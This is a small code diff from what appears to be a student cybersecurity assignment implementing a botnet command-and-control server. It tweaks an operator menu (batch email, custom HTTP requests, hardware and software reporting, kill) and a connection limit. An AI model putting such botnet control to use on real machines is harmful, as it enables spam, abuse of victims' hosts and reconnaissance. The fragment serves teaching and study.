@@ -26,7 +26,7 @@ EMAIL_PATH = r"/home/eddi/Desktop/hw_cybersec/CC/email.json"
 # irc_client part (old irc_client.py)
 
 def get_action(bot):
-    action = input("Perform by bot: send batch email ('b'), custom http request ('c'), hardware/software ('i'), stop current action ('idle'), kill ('kill') or exit irc connection('exit'). . . ") 
+    action = input("Perform by bot: send batch email ('b'), custom http request ('c'), hardware/software ('i'), stop current action ('idle'), kill ('kill') or exit connection('exit'). . . ") 
     if action == 'b':
         try:
             email = load_email(EMAIL_PATH)
@@ -259,7 +259,7 @@ def handle_bot_connection():
     # get the hostname
     host = config.server_info["ip"]
     port = config.server_info["port"]
-    clients = 2
+    clients = 1
 
     server_socket = socket.socket()  # get instance
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
